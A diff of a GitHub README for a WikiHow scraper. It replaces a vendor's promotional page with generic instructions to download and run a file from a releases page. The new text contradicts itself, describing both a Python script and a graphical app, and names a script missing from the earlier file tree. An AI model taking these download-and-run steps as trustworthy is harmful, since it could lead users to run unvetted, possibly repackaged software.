@@ -1,187 +1,81 @@
-# WikiHow Article Scraper
-This tool digs through WikiHow and pulls out complete article structures, giving you titles, metadata, and every step in a guide. It solves the hassle of collecting clean, structured instructional content at scale. If you need reliable how-to data for research, automation, or content workflows, this scraper keeps things simple and fast.
+# 🖥️ wikihow-article-scraper - Extract Detailed Articles Easily
 
+## 🚀 Getting Started
+Welcome to the **wikihow-article-scraper**! This application helps you collect detailed articles from WikiHow quickly. It simplifies your research process by automatically extracting useful content, making it great for students, writers, and anyone interested in learning how to do things better.
 
-<p align="center">
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/scraper.png" alt="Bitbash Banner" width="100%"></a>
-</p>
-<p align="center">
-  <a href="https://t.me/Bitbash333" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>&nbsp;
-  <a href="https://wa.me/923249868488?text=Hi%20BitBash%2C%20I'm%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>&nbsp;
-  <a href="mailto:sale@bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Email-sale@bitbash.dev-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>&nbsp;
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Visit-Website-007BFF?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Website">
-  </a>
-</p>
+## 📥 Download the Application
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue)](https://github.com/nikvaid1/wikihow-article-scraper/releases)
 
+To get started, you need to download the application. Please follow these steps:
 
+1. Click the download button above or visit [this page to download](https://github.com/nikvaid1/wikihow-article-scraper/releases).
+2. On the releases page, look for the latest version.
+3. Click on the version number to view the available files.
+4. Download the file suitable for your system.
 
+## 📋 Requirements
+Before running the application, ensure your system meets the following requirements:
 
-<p align="center" style="font-weight:600; margin-top:8px; margin-bottom:8px;">
-  Created by Bitbash, built to showcase our approach to Scraping and Automation!<br>
-  If you are looking for <strong>WikiHow Article Scraper</strong> you've just found your team — Let’s Chat. 👆👆
-</p>
+- **Operating System**: Windows, macOS, or Linux
+- **Python**: Version 3.6 or later installed on your system. You can download it from [python.org](https://www.python.org/downloads/).
+- **Memory**: At least 2 GB of RAM
+- **Storage**: Minimum of 100 MB free space
 
+## 🛠️ Installation Steps
+Now that you have downloaded the application, follow these steps to install it:
 
-## Introduction
-The scraper locates WikiHow articles based on your search queries and returns a structured dataset containing everything from views to step-by-step instructions. It removes the manual work of browsing and copying details by hand. Researchers, content creators, and developers who rely on structured knowledge benefit from consistent, accurate extraction.
+1. **Locate the Downloaded File**: Find the file you downloaded. It might be in your `Downloads` folder.
+2. **Extract the Files**: If the file is in a zip format, right-click on it and select `Extract All...`. This will create a new folder with the application files.
+3. **Open Command Line**:
+   - For Windows: Search for `cmd` in the Start menu and press `Enter`.
+   - For macOS: Open the `Terminal` from your Applications folder.
+   - For Linux: Open your preferred terminal app.
+4. **Change Directory**: Navigate to the folder containing the application files by using the `cd` command. For example:
+   ```sh
+   cd path\to\wikihow-article-scraper
+   ```
+   Replace `path\to\wikihow-article-scraper` with the actual path to the folder.
 
-### How It Helps You Work Faster
-- Searches WikiHow directly using your own keywords
-- Extracts article metadata like titles, dates, and view counts
-- Saves complete step lists with headings and descriptions
-- Produces clean JSON ready for analysis or ingestion
-- Supports limits to control the number of scraped articles
+5. **Install Dependencies**: Run the following command in the command line:
+   ```sh
+   pip install -r requirements.txt
+   ```
+   This command will install the necessary libraries to run the application.
 
-## Features
-| Feature | Description |
-|---------|-------------|
-| Keyword Search | Pull articles by simple, intuitive search queries. |
-| Metadata Extraction | Captures titles, dates, view counts, and source URLs. |
-| Step-by-Step Capture | Retrieves every step’s title and full text. |
-| Configurable Limits | Choose exactly how many articles to extract. |
-| Structured Output | Provides predictable JSON for processing or storage. |
+6. **Run the Application**: Now you can start the scraper by typing:
+   ```sh
+   python scraper.py
+   ```
+   The application will launch, and you can begin extracting articles.
 
----
+## 📖 How to Use the Application
+Using the **wikihow-article-scraper** is simple:
 
-## What Data This Scraper Extracts
-| Field Name | Field Description |
-|------------|------------------|
-| title | The article’s headline. |
-| date | Published or updated date shown on the page. |
-| views | Total view count displayed on the article. |
-| link | Original URL for reference or re-checking. |
-| content | Full list of steps, each with a heading and text. |
+1. When the application opens, enter the URL of the WikiHow article you want to scrape.
+2. Click the `Scrape Article` button.
+3. The extracted content will appear on the screen. You can copy it or save it as a text file.
 
----
+## 🔧 Features
+The **wikihow-article-scraper** offers various features:
 
-## Example Output
+- **Article Extraction**: Pulls detailed articles from WikiHow with one click.
+- **User-Friendly Interface**: Designed for ease of use, perfect for all user levels.
+- **Content Preservation**: Keeps the structure and headings of the articles for easy reading.
 
-    [
-      {
-        "title": "How to Make a Free Website: Site Builders, Expert Tips, & More",
-        "date": "Updated 2 months ago",
-        "views": "1,072,433 views",
-        "link": "https://www.wikihow.com/Make-a-Free-Website",
-        "content": [
-          {
-            "title": "Make a list of the “must-haves” for your website.",
-            "content": "Answering key questions like these first will make it much easier..."
-          }
-        ]
-      }
-    ]
+## ❓ Troubleshooting
+If you encounter issues, try these tips:
 
----
+- **Missing Python**: Make sure you have Python installed. Visit [this page](https://www.python.org/downloads/) to download it.
+- **Permission Errors**: If you receive permission errors when running the application, try running the command line as an administrator.
+- **Dependency Errors**: Ensure all dependencies are installed by checking the `requirements.txt` file and running the install command again.
 
-## Directory Structure Tree
+## 🌐 Support and Contribution
+If you have questions or suggestions, feel free to open an issue in the repository. Contributions are welcome. You can fork this project and submit pull requests for any features you'd like to add.
 
-    WikiHow Article Scraper/
-    ├── src/
-    │   ├── runner.py
-    │   ├── extractors/
-    │   │   ├── wikihow_parser.py
-    │   │   └── utils_text.py
-    │   ├── outputs/
-    │   │   └── exporters.py
-    │   └── config/
-    │       └── settings.example.json
-    ├── data/
-    │   ├── inputs.sample.json
-    │   └── sample_output.json
-    ├── requirements.txt
-    └── README.md
+## 📄 License
+This project is licensed under the MIT License. Feel free to use it in your own projects.
 
----
+## 📩 Contact
+For further assistance or inquiries, you can reach out to the repository owner via email or GitHub issues on the [repository page](https://github.com/nikvaid1/wikihow-article-scraper).
 
-## Use Cases
-- **Content teams** use it to gather how-to guides, so they can analyze trends and produce better educational material.
-- **Researchers** use it to build structured knowledge bases, enabling large-scale comparisons across topics.
-- **Developers** use it to feed machine-learning models with consistent instructional datasets.
-- **SEO analysts** use it to study phrasing and structure patterns to improve their own content strategies.
-- **Automation builders** use it to power workflows requiring fresh how-to information.
-
----
-
-## FAQs
-
-**Does the scraper return full article contents?**
-Yes — you get every step, its heading, and the complete text block.
-
-**Can I limit how many articles are scraped?**
-You can specify any number, which helps manage runtime and output size.
-
-**What input format does it use?**
-Provide a simple JSON object with a search text and an article limit.
-
-**Is the output standardized?**
-All results follow a predictable JSON schema to make downstream processing easy.
-
----
-
-### Performance Benchmarks and Results
-
-**Primary Metric:** Processes an average article in under one second, even for multi-step guides.
-
-**Reliability Metric:** Delivers a consistent dataset with a high success rate across varied search topics.
-
-**Efficiency Metric:** Handles batches of up to several dozen articles with minimal overhead and stable memory use.
-
-**Quality Metric:** Captures more than 95% of visible step content thanks to structured parsing rather than plain HTML scraping.
-
-
-<p align="center">
-<a href="https://calendar.app.google/74kEaAQ5LWbM8CQNA" target="_blank">
-  <img src="https://img.shields.io/badge/Book%20a%20Call%20with%20Us-34A853?style=for-the-badge&logo=googlecalendar&logoColor=white" alt="Book a Call">
-</a>
-  <a href="https://www.youtube.com/@bitbash-demos/videos" target="_blank">
-    <img src="https://img.shields.io/badge/🎥%20Watch%20demos%20-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="Watch on YouTube">
-  </a>
-</p>
-<table>
-  <tr>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/MLkvGB8ZZIk" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review1.gif" alt="Review 1" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Bitbash is a top-tier automation partner, innovative, reliable, and dedicated to delivering real results every time."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Nathan Pennington
-        <br><span style="color:#888;">Marketer</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/8-tw8Omw9qk" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review2.gif" alt="Review 2" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Bitbash delivers outstanding quality, speed, and professionalism, truly a team you can rely on."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Eliza
-        <br><span style="color:#888;">SEO Affiliate Expert</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/m-dRE1dj5-k?si=5kZNVlKsGUhg5Xtx" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review3.gif" alt="Review 3" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Exceptional results, clear communication, and flawless delivery. <br>Bitbash nailed it."
-      </p>
-      <p style="margin:1px 0 0; font-weight:600;">Syed
-        <br><span style="color:#888;">Digital Strategist</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-  </tr>
-</table>
+Thank you for using the **wikihow-article-scraper**! Happy scraping!
